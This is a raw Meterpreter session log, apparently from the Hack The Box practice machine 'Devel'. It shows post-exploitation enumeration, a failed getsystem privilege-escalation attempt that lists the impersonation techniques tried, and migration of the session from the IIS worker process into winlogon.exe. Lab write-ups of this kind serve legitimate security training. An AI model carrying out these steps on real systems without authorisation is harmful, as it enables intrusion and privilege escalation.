meterpreter > sysinfo 
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > 

meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter >

meterpreter > getsid
Server SID: S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550
meterpreter >

meterpreter > getsystem 
[-] priv_elevate_getsystem: Operation failed: 1726 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter >

meterpreter > getpid
Current pid: 1572
meterpreter >

meterpreter > migrate 432
[*] Migrating from 1572 to 432...
...
[*] Migration completed successfully.
meterpreter > 
meterpreter > getpid
Current pid: 432
meterpreter >

meterpreter > ps w3
Filtering on 'w3'

Process List
============

 PID   PPID  Name      Arch  Session  User             Path
 ---   ----  ----      ----  -------  ----             ----
 1572  1600  w3wp.exe  x86   0        IIS APPPOOL\Web  c:\windows\system32\inetsrv\w3wp.exe

meterpreter > ps win
Filtering on 'win'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 376  304   wininit.exe
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe

meterpreter > ps -S winlogon
Filtering on 'winlogon'

Process List
============

 PID  PPID  Name          Arch  Session  User  Path
 ---  ----  ----          ----  -------  ----  ----
 432  368   winlogon.exe  x86   1              C:\Windows\system32\winlogon.exe